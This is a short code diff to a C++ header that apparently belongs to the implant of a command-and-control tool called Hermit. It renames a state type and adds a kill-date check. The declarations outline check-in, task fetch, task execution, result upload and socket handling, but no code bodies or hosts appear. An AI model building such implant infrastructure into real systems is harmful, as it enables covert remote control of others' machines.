@@ -9,19 +9,20 @@
 
 namespace Handler
 {
-	VOID HTTPInit(State::PState pState);
-	VOID HTTPClose(State::PState pState);
-	std::wstring GetInitialInfoJSON(State::PState pState);
-	BOOL CheckIn(State::PState pState, const std::wstring& wInfoJson);
-	BOOL TaskGet(State::PState pState);
-	BOOL TaskExecute(State::PState pState);
-	BOOL TaskResultSend(State::PState pState);
-	BOOL Task(State::PState pState);
-	BOOL SocketAccept(State::PState pState);
-	BOOL SocketRead(State::PState pState);
-	// BOOL SocketClose(State::PState pState);
-	// BOOL SocketKill(State::PState pState);
-	BOOL Socket(State::PState pState);
+	VOID HTTPInit(State::PSTATE pState);
+	VOID HTTPClose(State::PSTATE pState);
+	std::wstring GetInitialInfoJSON(State::PSTATE pState);
+	BOOL CheckIn(State::PSTATE pState, const std::wstring& wInfoJson);
+	BOOL TaskGet(State::PSTATE pState);
+	BOOL TaskExecute(State::PSTATE pState);
+	BOOL TaskResultSend(State::PSTATE pState);
+	BOOL Task(State::PSTATE pState);
+	BOOL SocketAccept(State::PSTATE pState);
+	BOOL SocketRead(State::PSTATE pState);
+	// BOOL SocketClose(State::PSTATE pState);
+	// BOOL SocketKill(State::PSTATE pState);
+	BOOL Socket(State::PSTATE pState);
+	BOOL IsKillDateReached(INT nKillDate);
 }
 
 #endif // HERMIT_CORE_HANDLER_HPP
